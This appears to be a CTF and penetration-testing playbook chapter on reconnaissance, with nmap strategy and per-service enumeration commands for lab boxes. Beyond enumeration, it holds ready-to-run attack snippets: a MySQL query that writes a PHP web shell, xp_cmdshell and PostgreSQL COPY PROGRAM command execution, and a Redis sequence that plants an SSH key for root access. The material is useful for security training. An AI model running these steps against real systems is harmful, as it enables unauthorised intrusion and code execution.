# 02 — Recon & Enumeration

This is the make-or-break phase. Most boxes are won here, before a single exploit fires.

---

## 1. Connectivity Check

```bash
ping -c 2 <ip>
# If ICMP filtered, that's normal — don't conclude the host is down.
# Confirm with a TCP connect attempt instead:
nc -zv <ip> 80 443 22
```

Add to `/etc/hosts` early:
```bash
echo "<ip> box.htb" | sudo tee -a /etc/hosts
```

---

## 2. Port Scanning Strategy

Use a **two-pass approach**: a fast all-port pass, then a deep dive on what's open.

### 2.1 Pass 1 — fast, all ports
```bash
sudo nmap -p- --min-rate 5000 -T4 -Pn -oN nmap/all-ports.txt <ip>
```
- `-p-` : all 65535 TCP ports
- `--min-rate 5000` : send at least 5000 pps; tune up if network is fast
- `-T4` : aggressive timing (don't go T5 against fragile boxes)
- `-Pn` : skip host discovery (you already know it's up)
- `-oN` : human-readable output

Faster alternative for a first sweep:
```bash
rustscan -a <ip> --range 1-65535 --ulimit 5000 -- -sCV -oN nmap/services.txt
# masscan is even faster but less accurate; useful for /16+ ranges
sudo masscan -p1-65535 --rate 10000 <ip> -oG nmap/masscan.gnmap
```

### 2.2 Pass 2 — service/version + scripts
Take the open ports from pass 1:
```bash
PORTS=$(grep -oP '\d+/open' nmap/all-ports.txt | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -p"$PORTS" -oN nmap/services.txt <ip>
```
- `-sC` : default safe NSE scripts
- `-sV` : version detection
- Add `-O` for OS fingerprinting if you need it (requires raw sockets)

### 2.3 Pass 3 — UDP (commonly overlooked)
```bash
sudo nmap -sU --top-ports 100 --min-rate 1000 -oN nmap/udp.txt <ip>
```
UDP is slow. Top 100 is a good start; expand if interesting (53, 67, 69, 123, 161, 500).

### 2.4 Pass 4 — vuln scripts (selective)
```bash
sudo nmap --script vuln -p"$PORTS" -oN nmap/vuln.txt <ip>
# or specific:
sudo nmap --script smb-vuln-* -p139,445 <ip>
sudo nmap --script http-vuln-* -p80,443,8080 <ip>
```
NSE vuln scripts are noisy and produce false positives. Use them as hints, not conclusions.

### 2.5 Common Nmap script gold
- `ssh-hostkey`, `ssh-auth-methods`, `ssh2-enum-algos`
- `smb-os-discovery`, `smb-enum-shares`, `smb-enum-users`
- `ldap-rootdse`, `ldap-search`
- `http-title`, `http-headers`, `http-methods`, `http-enum`, `http-robots.txt`
- `ftp-anon`, `ftp-syst`
- `rdp-ntlm-info`, `rdp-enum-encryption`
- `ssl-cert`, `ssl-enum-ciphers`
- `dns-zone-transfer`, `dns-recursion`

---

## 3. Per-Service Enumeration

Open-port → first-moves cheatsheet. For each service, the goal is: *banner → version → known CVEs → service-specific enum*.

### 3.1 21 — FTP
```bash
nmap --script "ftp-* and not brute" -p21 <ip>
ftp <ip>           # try anonymous:anonymous
# or
lftp -u anonymous, <ip>
# Recursive listing
wget -m --no-passive ftp://anonymous:anonymous@<ip>/
```
Look for: writable directories, source code backups, config files, `id_rsa`, `.bash_history`.

### 3.2 22 — SSH
```bash
nc -nv <ip> 22                  # banner
nmap --script ssh2-enum-algos,ssh-auth-methods -p22 <ip>
```
- Old OpenSSH (<7.7): username enumeration via timing (`CVE-2018-15473`)
- Don't brute SSH unless you have a high-confidence wordlist — slow, and modern boxes rate-limit
- Check for `id_rsa` keys *everywhere else* — SSH is usually the *destination*, not the entry

### 3.3 23 — Telnet
```bash
nc -nv <ip> 23
```
Almost always old / embedded. Try default creds (admin/admin, root/root).

### 3.4 25 / 465 / 587 — SMTP
```bash
nc -nv <ip> 25
# in session:
HELO test
VRFY root           # user enum if VRFY allowed
EXPN postmaster
```
```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <ip>
```

### 3.5 53 — DNS
```bash
dig version.bind chaos txt @<ip>
dig axfr @<ip> <domain>          # zone transfer
dig any <domain> @<ip>
# subdomain brute
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r <ip>
```
A successful AXFR is a complete map of internal hosts.

### 3.6 80 / 443 / 8080 — HTTP(S)
See `03-web-enumeration.md` for the full play. Quick start:
```bash
whatweb -a 3 http://<ip>
curl -sI http://<ip>
nikto -h http://<ip>
feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -x php,html,txt
```

### 3.7 88 — Kerberos
A live Kerberos port = AD domain controller. Pivot to AD enum:
```bash
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.LOCAL',userdb=users.txt <ip>
kerbrute userenum --dc <ip> -d domain.local users.txt
```
See `08-active-directory.md`.

### 3.8 110 / 143 / 993 / 995 — POP3 / IMAP
```bash
nc -nv <ip> 110
USER admin
PASS password
LIST
RETR 1
```
Mailboxes hold creds, internal hostnames, and password-reset clues.

### 3.9 111 / 2049 — RPCbind / NFS
```bash
rpcinfo -p <ip>
showmount -e <ip>            # list exports
mkdir /mnt/nfs && sudo mount -t nfs <ip>:/share /mnt/nfs -o nolock
ls -la /mnt/nfs              # check root_squash
```
**no_root_squash** export = root on attacker can write SUID-root files into the share.

### 3.10 135 / 139 / 445 — SMB
```bash
enum4linux-ng -A <ip>
smbclient -L //<ip>/ -N
smbmap -H <ip> -u '' -p ''
crackmapexec smb <ip> -u '' -p ''  --shares
# null sessions
rpcclient -U "" -N <ip>
# inside rpcclient: enumdomusers, queryuser <RID>, srvinfo
```
Mount specific share:
```bash
smbclient //<ip>/share -U 'guest%'
mount -t cifs //<ip>/share /mnt/smb -o username=guest,password=
```

### 3.11 161 — SNMP
```bash
onesixtyone -c /usr/share/seclists/Miscellaneous/wordlist-common-snmp-community-strings.txt <ip>
snmpwalk -v2c -c public <ip>
snmpwalk -v2c -c public <ip> 1.3.6.1.4.1.77.1.2.25   # Windows users
snmpwalk -v2c -c public <ip> 1.3.6.1.2.1.25.4.2     # processes
snmpwalk -v2c -c public <ip> 1.3.6.1.2.1.25.6.3.1.2 # installed software
```
SNMP often leaks usernames, software versions, and even running command lines.

### 3.12 389 / 636 / 3268 — LDAP / LDAPS
```bash
ldapsearch -x -H ldap://<ip> -s base namingcontexts
ldapsearch -x -H ldap://<ip> -b "DC=domain,DC=local"
nmap --script ldap-rootdse,ldap-search -p389 <ip>
```
With creds:
```bash
ldapsearch -x -H ldap://<ip> -D 'user@domain.local' -w 'pass' -b "DC=domain,DC=local" "(objectClass=user)"
```

### 3.13 1433 — MSSQL
```bash
nmap --script ms-sql-info -p1433 <ip>
impacket-mssqlclient sa:Password@<ip> -windows-auth
# inside session:
EXEC xp_cmdshell 'whoami'    # if enabled / sysadmin
```
MSSQL → OS RCE via `xp_cmdshell` is a classic Windows foothold.

### 3.14 2049 — see NFS above

### 3.15 3306 — MySQL / MariaDB
```bash
nmap --script mysql-info,mysql-empty-password,mysql-users -p3306 <ip>
mysql -h <ip> -u root -p
# common defaults: root:root, root:''
```
With FILE privilege:
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php';
```

### 3.16 3389 — RDP
```bash
nmap --script rdp-* -p3389 <ip>
xfreerdp /u:user /p:pass /v:<ip> /dynamic-resolution +clipboard /drive:share,/tmp/share
```
NLA-required boxes need creds before banner.

### 3.17 5432 — PostgreSQL
```bash
psql -h <ip> -U postgres
# try blank, postgres, admin
```
Postgres `COPY ... PROGRAM` for RCE if superuser:
```sql
CREATE TABLE x(t TEXT);
COPY x FROM PROGRAM 'id';
SELECT * FROM x;
```

### 3.18 5985 / 5986 — WinRM
```bash
crackmapexec winrm <ip> -u user -p pass
evil-winrm -i <ip> -u user -p pass
# with hash
evil-winrm -i <ip> -u user -H <NTLM>
```

### 3.19 6379 — Redis
```bash
redis-cli -h <ip>
> info
> keys *
> config get dir
```
Unauth Redis → SSH key write trick:
```bash
ssh-keygen -t rsa -f rk
(printf "\n\n"; cat rk.pub; printf "\n\n") > rk.txt
redis-cli -h <ip> flushall
cat rk.txt | redis-cli -h <ip> -x set crackit
redis-cli -h <ip> config set dir /root/.ssh/
redis-cli -h <ip> config set dbfilename "authorized_keys"
redis-cli -h <ip> save
ssh -i rk root@<ip>
```

### 3.20 27017 — MongoDB
```bash
mongo --host <ip>
> show dbs
> use db
> db.users.find()
```

---

## 4. Banner Grabbing — Generic

When facing an unknown service:
```bash
nc -nv <ip> <port>
# or for binary protocols
echo -e "\r\n" | nc -nv <ip> <port>
# TLS-wrapped
openssl s_client -connect <ip>:<port>
```

Always note the exact version. Then:
```bash
searchsploit <product> <version>
```
Read the resulting PoCs critically — many are PoC-only or modified to leak.

---

## 5. Service Version → Vulnerability Mapping

The skill is converting `OpenSSH 7.6p1` or `Apache httpd 2.4.49` into a useful lead. Sources:

- `searchsploit` — local Exploit-DB mirror. `searchsploit -u` weekly.
- https://nvd.nist.gov/ — official CVE database
- https://cve.mitre.org/cve/search_cve_list.html
- https://github.com/trickest/cve — daily-updated CVE → PoC mapping
- Vendor security advisories (Microsoft, Cisco, Atlassian, etc.)

For a version, search:
1. The exact version
2. The major.minor (vendors patch silently)
3. The product name + "CVE 2024" / current year
4. The product name + "exploit" on GitHub

---

## 6. OS Detection & Fingerprinting

```bash
sudo nmap -O <ip>
# from TTL alone:
ping <ip>          # 64≈Linux, 128≈Windows, 255≈network device
# from headers:
curl -sI http://<ip> | grep -i server
```

OS guess informs everything:
- Path separators
- Default users (`administrator` vs `root`)
- Privesc vector classes
- Tooling (CMD vs Bash, ps1 vs sh)

---

## 7. Output Discipline

Save **every** scan to disk. You will re-grep these files dozens of times.

```bash
mkdir -p nmap
sudo nmap -sCV -oA nmap/quick <ip>            # all formats
sudo nmap -p- -oA nmap/full <ip>
```

`-oA` writes `.nmap`, `.gnmap`, and `.xml`. The XML is invaluable for tooling like `nmap-parse-output` or feeding into Metasploit:
```
msf6> db_import nmap/full.xml
msf6> services
```

---

## 8. Recon Anti-Patterns

- Running `nmap` once, with default ports, and assuming you saw everything.
- Skipping UDP because "it's slow."
- Not adding hostnames to `/etc/hosts` and missing virtual hosts.
- Trusting a tool's "no service" verdict over a manual `nc` banner grab.
- Treating `nikto`/`vuln` output as ground truth without verification.
- Not saving output, then re-running scans you already did.

---

## 9. Speed-up Tricks

- Run port scan and a directory fuzz **in parallel** in different tmux panes.
- Pre-create your notes file before scans finish — write down hypotheses as scans complete.
- Use `--min-rate` aggressively when network/host can take it.
- Cache hostname-to-IP in `/etc/hosts` so you never type IPs.
- Alias common scans:
```bash
alias nmap-quick='sudo nmap -sCV --min-rate 1000 -T4 -oN'
alias nmap-full='sudo nmap -p- --min-rate 5000 -T4 -oN'
```

---

## 10. When Nothing Works

If your scan shows only one port and you have no idea what to do next:

1. **Banner-grab manually** — automated tools sometimes mis-identify.
2. **Try TLS** — `openssl s_client -connect ip:port`.
3. **Probe with a real client** — telnet, nc, curl, smbclient, ldapsearch.
4. **Re-scan with different timing** — sometimes ports drop with `-T4` aggression; try `-T2`.
5. **Consider source-IP filtering** — VPN drop and reconnect to grab a fresh IP.
6. **Check the box description / tags** — clue is in there.
7. **Re-read the banner you already have** — versions, hostnames, weird tokens.

---

*Recon & enumeration is not a phase you finish. It's a phase you return to every time you make progress, because progress unlocks more enumeration.*
